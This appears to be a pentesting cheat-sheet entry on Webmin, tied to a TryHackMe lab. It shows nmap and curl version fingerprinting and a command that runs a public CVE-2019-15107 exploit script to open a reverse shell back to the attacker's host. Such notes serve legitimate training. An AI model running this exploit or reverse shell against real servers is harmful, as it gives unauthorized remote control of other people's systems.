# webmin

[![source](../../../../../cybersecurity/_badges/thm-p/source.svg)](https://tryhackme.com/room/source)

<div class="row row-cols-lg-2"><div>

[Webmin](https://webmin.com/) (3.3k ⭐) is an open-source web-based interface for system administration for Linux systems. From the interface, we can:

* Manage packages
* Manage users
* Manage system configurations
* Manage network configurations
* ...

**Port** 🐊: 10000 (TCP)
</div><div>
</div></div>

<hr class="sep-both">

## Pentester Notes ☠️

<div class="row row-cols-lg-2"><div>

* You can use [nmap](/cybersecurity/red-team/tools/scanners/ports/nmap.md)

```shell!
$ nmap -p 10000 IP
10000/tcp open  snet-sensor-mgmt
$ nmap -p 10000 -sV IP
10000/tcp open  http    syn-ack MiniServ 1.890 (Webmin httpd)
```

* You can use cURL too if you want to find the version

```shell!
$ curl -s -I -k https://10.10.199.204:10000 | grep Server
Server: MiniServ/1.890
```
</div><div>

* You may be able to exploit [CVE-2019-15107](https://github.com/squid22/Webmin_CVE-2019-15107/blob/main/webmin_exploit.py)

```shell!
$ [...] # start a reverse shell listener
$ python3 webmin_exploit.py target_ip target_port host_ip host_port
```
</div></div>